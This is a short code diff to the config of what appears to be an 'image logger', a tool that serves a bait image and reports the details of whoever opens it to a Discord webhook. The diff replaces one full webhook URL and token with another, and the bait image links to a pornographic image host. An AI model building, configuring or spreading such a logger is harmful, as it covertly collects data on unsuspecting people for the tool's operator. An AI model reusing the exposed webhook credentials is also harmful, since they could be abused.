@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1416772870935150652/cfJIZdkdqJAmocuI4MpyPVYQGn3bTxwRlciFJ7ZrSxu6kBjLDTqIVpyKYXNouSfFaIS-",
+    "webhook": "https://discord.com/api/webhooks/1416799688417611838/asAITi-4TLxx8sThcS--x6wGW3272xjioz8X5n_fs8jxydeEAK8H2RIKfVFYWSmTXNrN",
     "image": "https://rule34storage.b-cdn.net/posts/1014/1014704/1014704.picsmall.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
